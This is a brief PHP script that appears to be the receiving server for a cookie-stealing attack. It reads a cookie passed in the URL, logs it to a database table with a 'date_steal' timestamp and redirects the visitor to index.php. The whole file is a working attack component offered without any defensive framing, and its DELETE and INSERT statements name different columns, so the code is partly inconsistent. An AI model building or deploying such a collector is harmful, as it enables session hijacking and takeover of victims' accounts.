<?php

require_once "config.php";

if(isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    $stmt = $pdo->prepare("DELETE FROM cookie WHERE cookie = ?");
    $stmt->execute([$cookie]);
    $stmt = $pdo->prepare("INSERT INTO cookie (value, date_steal) VALUES (?, CURRENT_TIMESTAMP)");
    $stmt->execute([$cookie]);
}
header("Location: index.php");
